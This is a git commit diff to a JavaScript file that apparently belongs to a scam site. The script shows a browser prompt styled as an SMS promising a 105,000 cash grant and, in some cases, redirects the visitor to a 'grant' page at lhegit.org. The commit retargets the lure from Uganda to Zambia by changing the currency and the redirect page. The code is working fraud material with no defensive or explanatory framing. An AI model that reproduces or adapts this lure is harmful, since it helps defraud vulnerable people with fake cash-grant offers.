7edd4b81ad25c418ffa006a290f8bab6ed2d519f
itidnewblog3 <ukpehaitid1@gmail.com>
2025-10-21 22:09:01 +0100

    Update uganda-avtivation.js

--- uganda-avtivation.js
+++ uganda-avtivation.js
@@ -1,5 +1,5 @@
-var password = 'WITHDRAW UGX105,000'
-password=prompt('SMS: Congratulations, you are among the selected ones to receive UGX105,000 cash grant, Press Ok to withdraw cash Now ','WITHDRAW UGX105,000');
-if (password != 'WITHDRAW UGX105,000') {
-location.href='https://lhegit.org/uganda-grant.html';
+var password = 'WITHDRAW ZMW105,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ZMW105,000 cash grant, Press Ok to withdraw cash Now ','WITHDRAW ZMW105,000');
+if (password != 'WITHDRAW ZMW105,000') {
+location.href='https://lhegit.org/zambia-grant.html';
 }
